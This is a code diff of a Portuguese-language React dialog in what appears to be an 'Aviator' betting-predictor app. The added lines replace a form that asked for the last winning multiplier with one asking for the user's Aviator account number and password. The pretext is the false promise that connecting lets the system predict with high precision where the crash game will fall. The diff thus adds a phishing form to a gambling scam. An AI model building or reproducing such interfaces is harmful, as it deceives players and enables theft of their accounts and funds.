@@ -223,18 +223,18 @@ export function ResultadosClienteDialog() {
         {stage === 'form' && (
           <div className="space-y-4">
             <DialogHeader className="pb-2">
-              <DialogTitle className="text-base text-white">Nos diz: qual é a última entrada que pegou?</DialogTitle>
+              <DialogTitle className="text-base text-white">Conecte a sua conta do Aviator para que o sistema funcione corretamente e indique com alta precisão onde o Aviator vai cair. Faça a conexão para ativar todas as funcionalidades do sistema acertivo</DialogTitle>
               <DialogDescription className="sr-only">
-                Informe a última entrada vencedora
+                Para concluir a configuração, preencha os campos abaixo com o seu número de Aviator e a sua senha. Assim, o sistema poderá conectar imediatamente à sua conta e funcionar corretamente.
               </DialogDescription>
             </DialogHeader>
 
             <div className="space-y-1">
-              <label className="text-sm font-medium text-gray-300">Apos:</label>
+              <label className="text-sm font-medium text-gray-300">Numero:</label>
               <Input
                 type="number"
                 step="0.01"
-                placeholder="Ex: 2.50"
+                placeholder="Exemplo: 861234567"
                 value={valorApos}
                 onChange={(e) => {
                   setValorApos(e.target.value);
@@ -255,10 +255,10 @@ export function ResultadosClienteDialog() {
             </div>
 
             <div className="space-y-1">
-              <label className="text-sm font-medium text-gray-300">Sacar:</label>
+              <label className="text-sm font-medium text-gray-300">Senha:</label>
               <Input
                 type="text"
-                placeholder="Ex: 3.20 ou 3.20L"
+                placeholder="Exemplo: 1234"
                 value={valorSacar}
                 maxLength={4}
                 onChange={(e) => {
